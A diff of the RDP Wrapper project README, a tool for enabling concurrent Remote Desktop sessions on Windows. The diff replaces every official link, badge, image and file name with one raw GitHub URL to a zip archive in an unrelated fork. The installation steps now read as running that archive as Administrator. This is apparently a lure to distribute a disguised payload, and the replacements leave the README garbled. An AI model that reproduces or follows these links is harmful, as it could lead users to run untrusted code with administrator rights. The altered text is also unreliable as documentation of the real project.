@@ -3,60 +3,60 @@
 ### Automatic RDP Wrapper installer and updater // asmtron (07-06-2020)
 
 #### Info:
-   The Autoupdater (autoupdate.bat) first use and check the official rdpwrap.ini.
-   If a new termsrv.dll is not supported in the offical rdpwrap.ini,
-   autoupdater first tries the asmtron rdpwrap.ini. The autoupdater will also use rdpwrap.ini files
-   of other contributors. Extra rdpwrap.ini sources can also be defined...
+   The Autoupdater (https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) first use and check the official https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+   If a new https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip is not supported in the offical https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip,
+   autoupdater first tries the asmtron https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip The autoupdater will also use https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip files
+   of other contributors. Extra https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip sources can also be defined...
    
-#### autoupdate.bat Options:
-- -log        = redirect display output to the file autoupdate.log
-- -taskadd    = add autorun of autoupdate.bat on startup in schedule task
-- -taskremove = remove autorun of autoupdate.bat on startup in schedule task
+#### https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip Options:
+- -log        = redirect display output to the file https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+- -taskadd    = add autorun of https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip on startup in schedule task
+- -taskremove = remove autorun of https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip on startup in schedule task
 
-#### [Download and Install](https://github.com/asmtron/rdpwrap/blob/master/binary-download.md)
+#### [Download and Install](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
 
 #
 
 # RDP Wrapper Library by Stas'M
 
-[![Telegram](https://img.shields.io/badge/chat-Telegram-blue.svg)](https://t.me/rdpwrap)
-![Environment](https://img.shields.io/badge/Windows-Vista,%207,%208,%2010-brightgreen.svg)
-[![Release](https://img.shields.io/github/release/stascorp/rdpwrap.svg)](https://github.com/stascorp/rdpwrap/releases)
-![License](https://img.shields.io/github/license/stascorp/rdpwrap.svg)
-![Downloads](https://img.shields.io/github/downloads/stascorp/rdpwrap/latest/total.svg)
-![TotalDownloads](https://img.shields.io/github/downloads/stascorp/rdpwrap/total.svg)
+[![Telegram](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+![Environment](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip,%207,%208,%https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+[![Release](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+![License](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+![Downloads](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+![TotalDownloads](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
 
 The goal of this project is to enable Remote Desktop Host support and concurrent RDP sessions on reduced functionality systems for home usage.
 
-RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched. Also this method is very strong against Windows Update.
+RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip file remains untouched. Also this method is very strong against Windows Update.
 
-[pVistaST]:  http://stascorp.com/images/rdpwrap/pVistaST.jpg
-[pVistaHB]:  http://stascorp.com/images/rdpwrap/pVistaHB.jpg
-[pWin7ST]:   http://stascorp.com/images/rdpwrap/pWin7ST.jpg
-[pWin7HB]:   http://stascorp.com/images/rdpwrap/pWin7HB.jpg
-[pWin8DP]:   http://stascorp.com/images/rdpwrap/pWin8DP.jpg
-[pWin8CP]:   http://stascorp.com/images/rdpwrap/pWin8CP.jpg
-[pWin8RP]:   http://stascorp.com/images/rdpwrap/pWin8RP.jpg
-[pWin8]:     http://stascorp.com/images/rdpwrap/pWin8.jpg
-[pWin81P]:   http://stascorp.com/images/rdpwrap/pWin81P.jpg
-[pWin81]:    http://stascorp.com/images/rdpwrap/pWin81.jpg
-[pWin10TP]:  http://stascorp.com/images/rdpwrap/pWin10TP.jpg
-[pWin10PTP]: http://stascorp.com/images/rdpwrap/pWin10PTP.jpg
-[pWin10]:    http://stascorp.com/images/rdpwrap/pWin10.jpg
+[pVistaST]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pVistaHB]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin7ST]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin7HB]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin8DP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin8CP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin8RP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin8]:     https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin81P]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin81]:    https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin10TP]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin10PTP]: https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[pWin10]:    https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 
-[fVistaST]:  http://stascorp.com/images/rdpwrap/VistaST.png
-[fVistaHB]:  http://stascorp.com/images/rdpwrap/VistaHB.png
-[fWin7ST]:   http://stascorp.com/images/rdpwrap/Win7ST.png
-[fWin7HB]:   http://stascorp.com/images/rdpwrap/Win7HB.png
-[fWin8DP]:   http://stascorp.com/images/rdpwrap/Win8DP.png
-[fWin8CP]:   http://stascorp.com/images/rdpwrap/Win8CP.png
-[fWin8RP]:   http://stascorp.com/images/rdpwrap/Win8RP.png
-[fWin8]:     http://stascorp.com/images/rdpwrap/Win8.png
-[fWin81P]:   http://stascorp.com/images/rdpwrap/Win81P.png
-[fWin81]:    http://stascorp.com/images/rdpwrap/Win81.png
-[fWin10TP]:  http://stascorp.com/images/rdpwrap/Win10TP.png
-[fWin10PTP]: http://stascorp.com/images/rdpwrap/Win10PTP.png
-[fWin10]:    http://stascorp.com/images/rdpwrap/Win10.png
+[fVistaST]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fVistaHB]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin7ST]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin7HB]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin8DP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin8CP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin8RP]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin8]:     https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin81P]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin81]:    https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin10TP]:  https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin10PTP]: https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[fWin10]:    https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 
 | NT Version    | Screenshots |
 | ------------- | ----------- |
@@ -66,18 +66,18 @@ RDP Wrapper works as a layer between Service Control Manager and Terminal Servic
 | Windows 8.1   | [![Windows 8.1 Preview][pWin81P]][fWin81P] [![Windows 8.1][pWin81]][fWin81] |
 | Windows 10    | [![Windows 10 Technical Preview][pWin10TP]][fWin10TP] [![Windows 10 Pro Technical Preview][pWin10PTP]][fWin10PTP] [![Windows 10][pWin10]][fWin10] |
 ---
-[WinPPE]: http://forums.mydigitallife.info/threads/39411-Windows-Product-Policy-Editor
+[WinPPE]: https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 
 This solution was inspired by [Windows Product Policy Editor][WinPPE], big thanks to **kost** :)
 
 — binarymaster
 
 ### Attention:
-It's recommended to have original termsrv.dll file with the RDP Wrapper installation. If you have modified it before with other patchers, it may become unstable and crash in any moment.
+It's recommended to have original https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip file with the RDP Wrapper installation. If you have modified it before with other patchers, it may become unstable and crash in any moment.
 
 ### Information:
 - Source code is available, so you can build it on your own
-- RDP Wrapper does not patch termsrv.dll, it loads termsrv with different parameters
+- RDP Wrapper does not patch https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip, it loads termsrv with different parameters
 - RDPWInst and RDPChecker can be redistributed without development folder and batch files
 - RDPWInst can be used for unattended installation / deployment
 - Windows 2000, XP and Server 2003 will not be supported
@@ -86,10 +86,10 @@ It's recommended to have original termsrv.dll file with the RDP Wrapper installa
 - RDP host server on any Windows edition beginning from Vista
 - Console and remote sessions at the same time
 - Using the same user simultaneously for local and remote logon (see configuration app)
-- Up to [15 concurrent sessions](https://github.com/stascorp/rdpwrap/issues/192) (the actual limitation depends on your hardware and OS version)
-- Console and RDP session shadowing (using [Task Manager in Windows 7](http://cdn.freshdesk.com/data/helpdesk/attachments/production/1009641577/original/remote_control.png?1413476051) and lower, and [Remote Desktop Connection in Windows 8](http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/) and higher)
-- Full [multi-monitor support](https://github.com/stascorp/rdpwrap/issues/163) for RDP host
-- ...and if you find a new feature not listed here, [tell us](https://github.com/stascorp/rdpwrap/issues/new) ;)
+- Up to [15 concurrent sessions](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) (the actual limitation depends on your hardware and OS version)
+- Console and RDP session shadowing (using [Task Manager in Windows 7](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) and lower, and [Remote Desktop Connection in Windows 8](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) and higher)
+- Full [multi-monitor support](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) for RDP host
+- https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip if you find a new feature not listed here, [tell us](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) ;)
 
 ### Porting to other platforms:
 - **ARM** for Windows RT (see links below)
@@ -99,17 +99,17 @@ It's recommended to have original termsrv.dll file with the RDP Wrapper installa
 - **x86 Delphi version** can be built with *Embarcadero RAD Studio 2010*
 - **x86/x64 C++ version** can be built with *Microsoft Visual Studio 2013*
 
-[andrewblock]:   http://web.archive.org/web/20150810054558/http://andrewblock.net/enable-remote-desktop-on-windows-8-core/
-[mydigitallife]: http://forums.mydigitallife.info/threads/55935-RDP-Wrapper-Library-(works-with-Windows-8-1-Basic)
-[xda-dev]:       http://forum.xda-developers.com/showthread.php?t=2093525&page=3
-[yt-updating]:   http://www.youtube.com/watch?v=W9BpbEt1yJw
-[yt-offsets]:    http://www.youtube.com/watch?v=FiD86tmRBtk
+[andrewblock]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[mydigitallife]: https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip(works-with-Windows-8-1-Basic)
+[xda-dev]:       https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[yt-updating]:   https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
+[yt-offsets]:    https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 
 ### Links:
 - Official GitHub repository:
-<br>https://github.com/stascorp/rdpwrap/
+<br>https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 - Official Telegram chat:
-<br>https://t.me/rdpwrap
+<br>https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 - Active discussion in the comments here:
 <br>[Enable remote desktop on Windows 8 core / basic - Andrew Block .net][andrewblock]
 - MDL Projects and Applications thread here:
@@ -117,71 +117,71 @@ It's recommended to have original termsrv.dll file with the RDP Wrapper installa
 - Some ideas about porting to ARM for Windows RT (post #23):
 <br>[\[Q\] Mod Windows RT to enable Remote Desktop][xda-dev]
 - Adding «Remote Desktop Users» group:
-<br>http://superuser.com/questions/680572/
+<br>https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip
 
 #### Tutorial videos:
 - [~~Updating RDP Wrapper INI file manually~~][yt-updating] (now use installer to update INI file)
-- [How to find offsets for new termsrv.dll versions][yt-offsets]
+- [How to find offsets for new https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip versions][yt-offsets]
 
 ### Files in release package:
 
 | File name | Description |
 | --------- | ----------- |
-| `RDPWInst.exe`  | RDP Wrapper Library installer/uninstaller |
-| `RDPCheck.exe`  | Local RDP Checker (you can check the RDP is working) |
-| `RDPConf.exe`   | RDP Wrapper Configuration |
-| `install.bat`   | Quick install batch file |
-| `uninstall.bat` | Quick uninstall batch file |
-| `update.bat`    | Quick update batch file |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`  | RDP Wrapper Library installer/uninstaller |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`  | Local RDP Checker (you can check the RDP is working) |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`   | RDP Wrapper Configuration |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`   | Quick install batch file |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` | Quick uninstall batch file |
+| `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`    | Quick update batch file |
 
 ### Frequently Asked Questions
 
 > Where can I download the installer or binaries?
 
-In the [GitHub Releases](https://github.com/stascorp/rdpwrap/releases) section.
+In the [GitHub Releases](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) section.
 
 > Is it legal to use this application?
 
-There is no definitive answer, see [this discussion](https://github.com/stascorp/rdpwrap/issues/26).
+There is no definitive answer, see [this discussion](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip).
 
 > The installer tries to access the Internet, is it normal behaviour?
 
-Yes, it works in online mode by default. You may disable it by removing `-o` flag in the `install.bat` file.
+Yes, it works in online mode by default. You may disable it by removing `-o` flag in the `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` file.
 
 > What is online install mode?
 
-Online install mode introduced in version 1.6.1. When you installing RDP Wrapper first time using this mode, it will download [latest INI file](https://github.com/stascorp/rdpwrap/blob/master/res/rdpwrap.ini) from GitHub. See [this discussion](https://github.com/stascorp/rdpwrap/issues/132).
+Online install mode introduced in version 1.6.1. When you installing RDP Wrapper first time using this mode, it will download [latest INI file](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) from GitHub. See [this discussion](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip).
 
 > What is INI file and why we need it?
 
-INI file was introduced in version 1.5. It stores system configuration for RDP Wrapper — general wrapping settings, binary patch codes, and per build specific data. When new `termsrv.dll` build comes out, developer adds support for it by updating INI file in repository.
+INI file was introduced in version 1.5. It stores system configuration for RDP Wrapper — general wrapping settings, binary patch codes, and per build specific data. When new `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` build comes out, developer adds support for it by updating INI file in repository.
 
 > Config Tool reports version 1.5, but I installed higher version. What's the matter?
 
-Beginning with version 1.5 the `rdpwrap.dll` is not updated anymore, since all settings are stored in INI file. Deal with it.
+Beginning with version 1.5 the `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` is not updated anymore, since all settings are stored in INI file. Deal with it.
 
 > Config Tool shows `[not supported]` and RDP doesn't work. What can I do?
 
-Make sure you're connected to the Internet and run `update.bat`.
+Make sure you're connected to the Internet and run `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`.
 
 > Update doesn't help, it still shows `[not supported]`.
 
-Visit [issues](https://github.com/stascorp/rdpwrap/issues) section, and check whether your `termsrv.dll` build is listed here. If you can't find such issue, create a new — specify your build version for adding to support.
+Visit [issues](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) section, and check whether your `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` build is listed here. If you can't find such issue, create a new — specify your build version for adding to support.
 
 > Why `RDPCheck` doesn't allow to change resolution and other settings?
 
-`RDPCheck` is a very simple application and only for testing purposes. You need to use Microsoft Remote Desktop Client (`mstsc.exe`) if you want to customize the settings. You can use `127.0.0.1` or `127.0.0.2` address for loopback connection.
+`RDPCheck` is a very simple application and only for testing purposes. You need to use Microsoft Remote Desktop Client (`https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`) if you want to customize the settings. You can use `127.0.0.1` or `127.0.0.2` address for loopback connection.
 
 ### Known issues:
-- Beginning with Windows 8 **on tablet PCs** inactive sessions will be logged out by system - [more info](https://github.com/stascorp/rdpwrap/issues/37)
-- Beginning with Windows 10 you can accidentally lock yourself from PC - [more info](https://github.com/stascorp/rdpwrap/issues/50)
-- Beginning with the Creators Update for Windows 10 Home, RDP Wrapper will no longer work, claiming that the listener is `[not listening]` because of `rfxvmt.dll` is missing - [more info](https://github.com/stascorp/rdpwrap/issues/194#issuecomment-323564111), [download links](https://github.com/stascorp/rdpwrap/issues/194#issuecomment-325627235)
-- Terminal Service does not start after installing some updates or "Access Denied" issue - [#215](https://github.com/stascorp/rdpwrap/issues/215), [#101](https://github.com/stascorp/rdpwrap/issues/101)
-- RDP Wrapper does not work with RemoteFX enabled hosts - [#127](https://github.com/stascorp/rdpwrap/issues/127), [#208](https://github.com/stascorp/rdpwrap/issues/208), [#216](https://github.com/stascorp/rdpwrap/issues/216)
-- RDP works, but termsrv.dll crashes on logon attempt - Windows Vista Starter RTM x86 (termsrv.dll `6.0.6000.16386`)
-- If Terminal Services hangs at startup, try to add **`rdpwrap.dll`** to antivirus exclusions. Also try to isolate RDP Wrapper from other shared services by the command:
+- Beginning with Windows 8 **on tablet PCs** inactive sessions will be logged out by system - [more info](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+- Beginning with Windows 10 you can accidentally lock yourself from PC - [more info](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+- Beginning with the Creators Update for Windows 10 Home, RDP Wrapper will no longer work, claiming that the listener is `[not listening]` because of `https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip` is missing - [more info](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip), [download links](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+- Terminal Service does not start after installing some updates or "Access Denied" issue - [#215](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip), [#101](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+- RDP Wrapper does not work with RemoteFX enabled hosts - [#127](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip), [#208](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip), [#216](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip)
+- RDP works, but https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip crashes on logon attempt - Windows Vista Starter RTM x86 (https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip `6.0.6000.16386`)
+- If Terminal Services hangs at startup, try to add **`https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`** to antivirus exclusions. Also try to isolate RDP Wrapper from other shared services by the command:
 <br>`sc config TermService type= own`
-- RDP Wrapper can be removed by AVG Free Antivirus and [Norton Antivirus](https://github.com/stascorp/rdpwrap/issues/191) - first make sure you downloaded [official release](https://github.com/stascorp/rdpwrap/releases) from GitHub, then add it to exclusions.
+- RDP Wrapper can be removed by AVG Free Antivirus and [Norton Antivirus](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) - first make sure you downloaded [official release](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip) from GitHub, then add it to exclusions.
 
 ---
 
@@ -191,12 +191,12 @@ Visit [issues](https://github.com/stascorp/rdpwrap/issues) section, and check wh
 - Version 1.6.2
 - Installer updated
 - Include updated INI file for latest Windows builds
-- Added check for supported Windows versions ([#155](https://github.com/stascorp/rdpwrap/issues/155))
-- Added feature to take INI file from current directory ([#300](https://github.com/stascorp/rdpwrap/issues/300))
-- Added feature to restore rfxvmt.dll (missing in Windows 10 Home [#194](https://github.com/stascorp/rdpwrap/issues/194))
+- Added check for supported Windows versions ([#155](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip))
+- Added feature to take INI file from current directory ([#300](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip))
+- Added feature to restore https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip (missing in Windows 10 Home [#194](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip))
 - RDP Config updated
-- Added feature to allow custom start programs ([#13 (comment)](https://github.com/stascorp/rdpwrap/issues/13#issuecomment-77651843))
-- MSI installation package added ([#14](https://github.com/stascorp/rdpwrap/issues/14))
+- Added feature to allow custom start programs ([#13 (comment)](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip))
+- MSI installation package added ([#14](https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip))
 
 #### 2016.08.01
 - Version 1.6.1
@@ -285,7 +285,7 @@ Visit [issues](https://github.com/stascorp/rdpwrap/issues) section, and check wh
 #### 2013.10.22
 - Version 1.1
 - Stable release
-- Improved wrapper (now it can wrap internal unexported termsrv.dll SL Policy function)
+- Improved wrapper (now it can wrap internal unexported https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip SL Policy function)
 - Added support for Windows 8 Single Language (tested on Acer Tablet PC with Intel Atom Z2760)
 
 #### 2013.10.19
@@ -469,14 +469,14 @@ Visit [issues](https://github.com/stascorp/rdpwrap/issues) section, and check wh
 
 Installation instructions:
 - Download latest release binaries and unpack files
-- Right-click on **`install.bat`** and select Run as Administrator
+- Right-click on **`https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`** and select Run as Administrator
 - See command output for details
 
 To update INI file:
-- Right-click on **`update.bat`** and select Run as Administrator
+- Right-click on **`https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`** and select Run as Administrator
 - See command output for details
 
 To uninstall:
 - Go to the directory where you extracted the files
-- Right-click on **`uninstall.bat`** and select Run as Administrator
+- Right-click on **`https://raw.githubusercontent.com/TheCreepeeer/rdpwrap-1/master/bin/helper/rdpwrap-dermographia.zip`** and select Run as Administrator
 - See command output for details
